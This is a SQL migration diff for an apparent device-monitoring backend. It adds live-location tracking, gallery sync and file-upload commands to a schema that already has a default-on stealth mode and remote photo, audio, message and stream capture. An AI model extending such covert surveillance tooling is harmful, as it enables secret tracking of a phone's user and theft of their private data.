@@ -55,6 +55,11 @@ CREATE TABLE IF NOT EXISTS public.monitored_devices (
   battery_level INTEGER DEFAULT 100 CHECK (battery_level >= 0 AND battery_level <= 100),
   is_charging BOOLEAN DEFAULT false, is_online BOOLEAN DEFAULT true, stealth_mode_active BOOLEAN DEFAULT true,
   pairing_code TEXT UNIQUE, last_seen_at TIMESTAMPTZ DEFAULT now(),
+  -- Live location columns (UPDATE only, not INSERT — prevents table bloat)
+  current_latitude DOUBLE PRECISION DEFAULT NULL,
+  current_longitude DOUBLE PRECISION DEFAULT NULL,
+  current_accuracy DOUBLE PRECISION DEFAULT NULL,
+  location_updated_at TIMESTAMPTZ DEFAULT NULL,
   created_at TIMESTAMPTZ NOT NULL DEFAULT now(), updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
 );
 
@@ -99,7 +104,7 @@ CREATE TABLE IF NOT EXISTS public.device_messages (
 CREATE TABLE IF NOT EXISTS public.device_commands (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
   device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
-  command TEXT NOT NULL CHECK (command IN ('ring_siren','take_photo','record_audio','sync_contacts','sync_calls','sync_messages','sync_apps','update_location','fetch_location','start_live_movement','stop_live_movement','webrtc_stream')),
+  command TEXT NOT NULL CHECK (command IN ('ring_siren','take_photo','record_audio','sync_contacts','sync_calls','sync_messages','sync_apps','sync_gallery','upload_file','update_location','fetch_location','start_live_movement','stop_live_movement','webrtc_stream')),
   payload JSONB DEFAULT '{}'::jsonb, status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending','sent','executed','failed')),
   result_media_path TEXT, executed_at TIMESTAMPTZ, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
 );
@@ -178,6 +183,9 @@ BEGIN
   END IF;
   IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'device_live_sessions') THEN
     ALTER PUBLICATION supabase_realtime ADD TABLE public.device_live_sessions;
+  END IF;
+  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'device_files') THEN
+    ALTER PUBLICATION supabase_realtime ADD TABLE public.device_files;
   END IF;
 END $$;
 
